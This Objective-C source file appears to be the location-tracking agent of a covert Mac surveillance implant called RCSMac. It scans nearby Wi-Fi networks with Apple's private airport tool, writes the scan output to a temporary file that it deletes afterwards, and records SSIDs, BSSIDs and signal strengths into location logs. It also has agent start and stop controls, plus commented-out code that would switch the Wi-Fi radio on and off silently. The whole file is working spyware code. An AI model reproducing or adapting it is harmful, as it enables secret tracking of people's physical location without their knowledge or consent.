//
//  RCSMAgentPosition.m
//  RCSMac
//
//  Created by kiodo on 2/21/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//
//#import <CoreWLAN/CoreWLAN.h>
#import <Foundation/Foundation.h>

#import "RCSMCommon.h"
#import "RCSMAgentPosition.h"
#import "RCSMLogger.h"
#import "RCSMDebug.h"


#define AIRPORT_TOOL @"/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"

typedef struct _WiFiInfo {
  unsigned char MacAddress[6];    // BSSID
  unsigned char dummy[2];
  UInt32 uSsidLen;                // SSID length
  unsigned char Ssid[32];         // SSID
  UInt32 iRssi;                   // Received signal strength in _dBm_
} WiFiInfo;

static RCSMAgentPosition *sharedAgentPosition = nil;

extern BOOL ACInterfaceGetPower(SCNetworkInterfaceRef);
extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);

@interface __CWInterface : NSObject
{
  NSNumber *ssidLen;      // SSID length
  NSString *ssid;         // SSID
  NSNumber *rssi;         // Received signal strength in _dBm
  NSData   *bssidData;    // BSSID [macAddress]
}

@property (readwrite, retain) NSNumber *rssi;

+ (NSMutableArray*)parseDictionary: (NSData*)sSid;
+ (NSMutableArray*)scanForNetworksWithParameters:(NSDictionary*)parameters 
                                    error:(NSError**)error;
- (id)init;

- (NSData*)bssidData;
- (NSNumber*)ssidLen;
- (NSString*)ssid;
- (void)setBssidData: (NSString*)aBssid;
- (void)setSsidLen: (NSNumber*) aSsidLen;
- (void)setSsid: (NSString*)aSsid;

@end

@implementation __CWInterface : NSObject

@synthesize rssi;

+ (NSMutableArray*)parseDictionary: (NSData*)xmlData
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *tmpArray = nil;
  NSString *errorDesc;

  if (xmlData == nil)
  {
#ifdef DEBUG_POSITION
    NSLog(@"%s: error on data file", __FUNCTION__);
#endif
    return nil;
  }
  
  NSArray *xmlDictArray = 
  (NSArray *)[NSPropertyListSerialization 
              propertyListFromData: xmlData 
              mutabilityOption: NSPropertyListMutableContainersAndLeaves 
              format: nil  
              errorDescription: &errorDesc];
  
  if (xmlDictArray == nil)
  {
#ifdef DEBUG_POSITION
    NSLog(@"%s: error on Array %@", __FUNCTION__, errorDesc);
#endif
    return nil;
  }
  
  if ([xmlDictArray count])
    tmpArray = [[NSMutableArray alloc] initWithCapacity: [xmlDictArray count]];
  
  for(int index=0; index < [xmlDictArray count]; index++)
  {
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
    NSNumber *i32Rssi;
    NSString *cBssid;
    NSString *cSsid;
    
    NSDictionary * tmpDict = (NSDictionary*)[xmlDictArray objectAtIndex: index];
    
    __CWInterface *tmpCWInt = [[__CWInterface alloc] init];
    
    if ((i32Rssi = [tmpDict objectForKey: @"RSSI"]) != nil) 
    {
#ifdef DEBUG_POSITION
      NSLog(@"%s: RSSI %@", __FUNCTION__, i32Rssi);
#endif
      NSNumber *tmpRssi = [[NSNumber alloc] initWithInt: [i32Rssi intValue]];
      [tmpCWInt setRssi: tmpRssi]; 
    }
    
    if ((cSsid = [tmpDict objectForKey: @"SSID_STR"]) != nil) 
    {
#ifdef DEBUG_POSITION
      NSLog(@"%s: SSID_STR %@ length %d", __FUNCTION__, cSsid, [cSsid length]);
#endif
      NSString *tmpSsid = [[NSString alloc] initWithFormat: @"%@", cSsid];
      
      [tmpCWInt setSsid: tmpSsid];
    }  
    
    if ((cBssid = [tmpDict objectForKey: @"BSSID"]) != nil) 
    {
#ifdef DEBUG_POSITION
      NSLog(@"%s: BSSID %@", __FUNCTION__, cBssid);
#endif
      [tmpCWInt setBssidData: cBssid];
    }
    
    [tmpArray addObject: tmpCWInt];
    
    [tmpCWInt release];
    
    [innerPool release];
  }
  
  [outerPool release];
  
  return tmpArray;
}

+ (NSMutableArray*)scanForNetworksWithParameters:(NSDictionary*)parameters 
                                           error:(NSError**)error
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *cwArray = nil;
  NSString *tmpXmlName;
  NSTask *aTask;
  time_t randTime = 0;
  NSArray *arguments;
  NSString *airport = AIRPORT_TOOL;
  NSFileHandle *aFile;

  // Create tmp output file
  ctime(&randTime);

  tmpXmlName = [[NSString alloc] initWithFormat: @"/tmp/43t9903zz%.8d.XXXX", randTime];
    
  [@"" writeToFile: tmpXmlName
        atomically: YES
          encoding: NSUTF8StringEncoding
             error: nil];
  
  aFile = [NSFileHandle fileHandleForUpdatingAtPath: tmpXmlName];
  
#ifdef DEBUG_POSITION
  NSLog(@"%s: file name %@, file handle %@", __FUNCTION__, tmpXmlName, aFile);
#endif
  
  if (aFile == nil) 
  {
    [pool release];
    return nil;
  }
 
  // Running task with options
  aTask = [[NSTask alloc] init];
  
  arguments = [NSArray arrayWithObjects: @"-s", @"-x", nil];
  
#ifdef DEBUG_POSITION
  NSLog(@"%s: arguments %@", __FUNCTION__, arguments);
#endif
  
  [aTask setLaunchPath: airport];

#ifdef DEBUG_POSITION
  NSLog(@"%s: program %@", __FUNCTION__, airport);
#endif
  
  [aTask setArguments: arguments];

  // Output file handles
  [aTask setStandardOutput: aFile];
  [aTask setStandardError: aFile];
  
#ifdef DEBUG_POSITION
  NSLog(@"%s: program is running", __FUNCTION__);
#endif

  // Run and wait
  [aTask launch];
  
  [aTask waitUntilExit];
  
  int status = [aTask terminationStatus];
  
  [aTask release];
  
#ifdef DEBUG_POSITION
  NSLog(@"%s: program retuned with status %d", __FUNCTION__, status);
#endif 
  
  if (status == 0)
  {
#ifdef DEBUG_POSITION
    NSLog(@"%s: Task %@ succeeded.", __FUNCTION__, airport);
#endif

    [aFile closeFile];
    
    NSData *tmpData = [[NSData alloc] initWithContentsOfFile: tmpXmlName];

    [[NSFileManager defaultManager] removeItemAtPath: tmpXmlName error: nil];
    
#ifdef DEBUG_POSITION
    NSLog(@"%s: tmpData 0x%X", __FUNCTION__, (u_int)tmpData);
#endif
    
    if (tmpData != nil && [tmpData length])
    {
      cwArray = [self parseDictionary: tmpData]; 
      
      [tmpData release];
    }
    else
    {
#ifdef DEBUG_POSITION
      NSLog(@"%s: error running airport tool: file is empty", __FUNCTION__);
#endif
    }

  }
  else
  {
#ifdef DEBUG_POSITION
    NSLog(@"%s: Task %@ failed.", __FUNCTION__, airport);
#endif
  }
  
  [tmpXmlName release];

  [pool release];
  
  return cwArray;
}

- (id)init
{
  self = [super init];
  if (self)
  {
    bssidData = nil;   // BSSID
    ssidLen = nil;     // SSID length
    rssi = nil;        // Received signal strength in _dBm
    ssid = nil;         // SSID
  }
  
  return self;
}

- (NSData*)bssidData
{
  return bssidData;
}

- (void)setBssidData: (NSString*)aString
{
  if (aString != nil) 
  {
    char tmpBuff[256];
    
    memset(tmpBuff, 0, sizeof(tmpBuff));
    
    [aString getCString: tmpBuff 
              maxLength: sizeof(tmpBuff) 
               encoding: NSASCIIStringEncoding];
    
    if (strlen(tmpBuff))
    {
      int digit;

      bssidData = [[NSData alloc] initWithBytes: "\x00\x00\x00\x00\x00\x00" length:6];
      char *dataPtr = (char *) [bssidData bytes]; 
      char **tokenPtr, *token[6];
      char *tmpPtr = tmpBuff;
      
      for (tokenPtr = token; (*tokenPtr = strsep(&tmpPtr, ":")) != NULL;)
        if (**tokenPtr != '\0')
          if (++tokenPtr >= &token[6])
            break;
      
      for (int i=0; i < 6; i++) 
      {
        sscanf(token[i], "%x", &digit);
        dataPtr[i] = digit;
      }
      
#ifdef DEBUG_POSITION
      NSLog(@"%s: bssidData %@", __FUNCTION__, bssidData);
#endif
    }
    else
    {
      bssidData = nil;
    }
  }
}

- (NSString*)ssid
{
  return ssid;
}

- (void)setSsid: (NSString*)aSsid
{
  if (aSsid != nil)
  {
    if ([aSsid lengthOfBytesUsingEncoding: NSUTF8StringEncoding] > 32) 
    {
      ssid = [[NSString alloc] initWithString: [aSsid substringToIndex: 32]];
      ssidLen = [[NSNumber alloc] initWithInt: 32];
    }
    else
    {
      ssid = aSsid;
      ssidLen = [[NSNumber alloc] initWithInt:[aSsid lengthOfBytesUsingEncoding: NSUTF8StringEncoding]];
    }
  }
  
#ifdef DEBUG_POSITION
  NSLog(@"%s: ssid %@", __FUNCTION__, ssid);
#endif
}

- (NSNumber*)ssidLen
{
  return ssidLen;
}

- (void) setSsidLen: (NSNumber*)aSsidLen
{
  if (aSsidLen != nil) 
  {
#ifdef DEBUG_POSITION
    NSLog(@"%s: aSsidLen %@", __FUNCTION__, aSsidLen);
#endif
    
    if ([aSsidLen intValue] > 32)
    {
      ssidLen = [[NSNumber alloc] initWithInt: 32];
      [aSsidLen release];
    }
    else
      ssidLen = aSsidLen;
  }
  
#ifdef DEBUG_POSITION
  NSLog(@"%s: ssidLen %@", __FUNCTION__, ssidLen);
#endif
}

@end

@implementation RCSMAgentPosition
#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSMAgentPosition *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentPosition == nil)
    {
      //
      // Assignment is not done here
      //
      [[self alloc] init];
    }
  }
  
  return sharedAgentPosition;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentPosition == nil)
    {
      sharedAgentPosition = [super allocWithZone: aZone];
      
      //
      // Assignment and return on first allocation
      //
      return sharedAgentPosition;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}


- (SCNetworkInterfaceRef)getAirportInterface:(CFStringRef) aNetInterface
{
  SCNetworkInterfaceRef intf = NULL;
  
  CFArrayRef netIntfArray = SCNetworkInterfaceCopyAll();
  
  if (netIntfArray == NULL)
  {
    return NULL;
  }
  
  int arrayCount = CFArrayGetCount(netIntfArray);
  
  for(int i=0; i < arrayCount; i++)
  {
    intf = CFArrayGetValueAtIndex(netIntfArray, i);
    
    CFStringRef intfName = SCNetworkInterfaceGetBSDName(intf);
    
    if( CFStringCompare(intfName, aNetInterface, kCFCompareCaseInsensitive) == kCFCompareEqualTo)
      break;
  }
  
  CFRetain(intf);
  
  CFRelease(netIntfArray);
  
  return  intf;
}

- (BOOL)setAirportPower:(CFStringRef) aNetInterface withMode:(BOOL)power
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  SCNetworkInterfaceRef intf = [self getAirportInterface: aNetInterface];

  if (intf != NULL)
  {
    ACInterfaceSetPower(intf, power);
    CFRelease(intf);
  }
  else
  {
    [pool release];
    return NO;
  }
  
  [pool release];
  
  return YES;
}

- (BOOL)isAirportPowerOn:(CFStringRef)aNetInterface
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL isPowered = NO;
  
  SCNetworkInterfaceRef intf = [self getAirportInterface: aNetInterface];
  
  if (intf != NULL)
  {
    isPowered = ACInterfaceGetPower(intf);
    CFRelease(intf);  
  }
  
  [pool release];
  
  return isPowered;
}

- (BOOL)grabHotspots
{
  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];

  //CFStringRef en1 = CFSTR("en1");
  //BOOL isAirportTurnedOn = YES;
  
  LocationAdditionalData *agentAdditionalHeader;
  NSError *err = nil;
  NSDictionary *params = nil;
  
  // check if airport is running
//  isAirportTurnedOn = [self isAirportPowerOn: en1];
//  
//  if (isAirportTurnedOn == NO)
//  {
//#ifdef DEBUG_POSITION
//    NSLog(@"%s: airport is OFF try to start it up", __FUNCTION__);
//#endif
//    if ([self setAirportPower: en1 withMode: 1])
//    {
//#ifdef DEBUG_POSITION
//      NSLog(@"%s: airport is ON", __FUNCTION__);
//#endif    
//      sleep(3);
//    }
//    else
//    {
//#ifdef DEBUG_POSITION
//      NSLog(@"%s: airport is OFF error on forcing", __FUNCTION__);
//#endif
//    }
//  }
  
  //  NSArray* scan = [NSMutableArray arrayWithArray:[[__CWInterface interface] 
  //                                                  scanForNetworksWithParameters:params 
  //                                                  error:&err]];
  // running airport tool...
  NSArray* scan = [__CWInterface scanForNetworksWithParameters: params 
                                                       error: &err];
  sleep(1);
  
  // Turn off again the netintf
//  if (isAirportTurnedOn == NO)
//  {
//#ifdef DEBUG_POSITION
//    NSLog(@"%s: airport is now ON try to stop it again", __FUNCTION__);
//#endif
//    if ([self setAirportPower: en1 withMode: 0])
//    {
//#ifdef DEBUG_POSITION
//      NSLog(@"%s: airport is OFF", __FUNCTION__);
//#endif    
//    }
//    else
//    {
//#ifdef DEBUG_POSITION
//      NSLog(@"%s: airport is already ON error on forcing", __FUNCTION__);
//#endif
//    }
//  }
  
  if (scan == nil) 
  {
#ifdef DEBUG_POSITION
    NSLog(@"%s: error parsing scan", __FUNCTION__);
#endif
    
    [pool release];
    
    return NO;
  }
  
  NSMutableData *rawAdditionalHeader = 
  [NSMutableData dataWithLength: sizeof(LocationAdditionalData)];
  
  agentAdditionalHeader = (LocationAdditionalData *)[rawAdditionalHeader bytes];
  
  agentAdditionalHeader->uVersion = LOG_LOCATION_VERSION;
  agentAdditionalHeader->uType = LOGTYPE_LOCATION_WIFI;
  agentAdditionalHeader->uStructNum = [scan count];
  
  RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOGTYPE_LOCATION_NEW
                           agentHeader: rawAdditionalHeader
                             withLogID: 0];

#ifdef DEBUG_POSITION
  NSLog(@"%s: rawAdditionalHeader %@", __FUNCTION__, rawAdditionalHeader);
#endif
  
  if (success == TRUE)
  {
    NSMutableData *tmpData = [[NSMutableData alloc] initWithLength: sizeof(WiFiInfo)];
    
    WiFiInfo *tmpInfo = (WiFiInfo *)[tmpData bytes];
     
#ifdef DEBUG_POSITION
    NSLog(@"%s: tmpData length %lu", __FUNCTION__, sizeof(WiFiInfo));
#endif 
    
    for (int i=0; i < [scan count]; i++) 
    {        
      memset(tmpInfo, 0, sizeof(tmpInfo));
      
      __CWInterface *icw = [scan objectAtIndex: i];

#ifdef DEBUG_POSITION
      NSLog(@"%s: icw ptr 0x%x", __FUNCTION__, (u_int)icw);
#endif
      
      if ([icw ssidLen] != nil)
      {
#ifdef DEBUG_POSITION
        NSLog(@"%s: uSsidLen %@", __FUNCTION__, [icw ssidLen]);
#endif
        tmpInfo->uSsidLen = [[icw ssidLen] intValue];

      }
      
      if ([icw ssid] != nil && tmpInfo->uSsidLen)
      {
        NSString *encStr = [icw ssid];
        
#ifdef DEBUG_POSITION
        NSLog(@"%s: tmpSSID encoding %@....", __FUNCTION__, encStr);
#endif
        NSData *tmpSSID = [encStr dataUsingEncoding: NSUTF8StringEncoding 
                               allowLossyConversion: YES];
        if (tmpSSID != nil) 
        {
#ifdef DEBUG_POSITION
          NSLog(@"%s: tmpSSID %@", __FUNCTION__, tmpSSID);
#endif
          memcpy(tmpInfo->Ssid, [tmpSSID bytes], tmpInfo->uSsidLen);
        }
        else
        {
#ifdef DEBUG_POSITION
          NSLog(@"%s: tmpSSID %s", __FUNCTION__, "XXXX");
#endif
          tmpInfo->uSsidLen = 4;
          memcpy(tmpInfo->Ssid, "XXXX", 4);
        }
        
#ifdef DEBUG_POSITION
        NSLog(@"%s: ssid %@", __FUNCTION__, [icw ssid]);
#endif 
      }
      else
      {
        tmpInfo->uSsidLen = 0;
      }
      
      if ([icw bssidData] != nil)
      {
#ifdef DEBUG_POSITION
        NSLog(@"%s: MacAddress %@", __FUNCTION__, [icw bssidData]);
#endif 
        memcpy(tmpInfo->MacAddress, [[icw bssidData] bytes], sizeof(tmpInfo->MacAddress));
      }
      
      if ([icw rssi] != nil)
      {
#ifdef DEBUG_POSITION
        NSLog(@"%s: iRssi %@", __FUNCTION__, [icw rssi]);
#endif 
        tmpInfo->iRssi = [[icw rssi] intValue];
      }
      
      [logManager writeDataToLog: tmpData
                        forAgent: LOGTYPE_LOCATION_NEW
                       withLogID: 0];
      
#ifdef DEBUG_POSITION
      NSLog(@"%s: tmpData %@", __FUNCTION__, tmpData);
#endif          
    }
  
    [tmpData release];
    
    [logManager closeActiveLog: LOGTYPE_LOCATION_NEW
                     withLogID: 0];
  }
  else
  {
#ifdef DEBUG_POSITION
    NSLog(@"%s: error creating logs", __FUNCTION__);
#endif
  }
  
  [scan release];
  
  [pool release];
  
  return YES;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];

  [self grabHotspots];

  [mAgentConfiguration setObject: AGENT_STOPPED
                          forKey: @"status"];  
  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP
                          forKey: @"status"];
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
         && internalCounter <= MAX_STOP_WAIT_TIME)
  {
    internalCounter++;
    usleep(100000);
  }
  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mAgentConfiguration)
  {
    [mAgentConfiguration release];
    mAgentConfiguration = [aConfiguration retain];
  }
}

- (NSMutableDictionary *)mAgentConfiguration
{
  return mAgentConfiguration;
}

@end
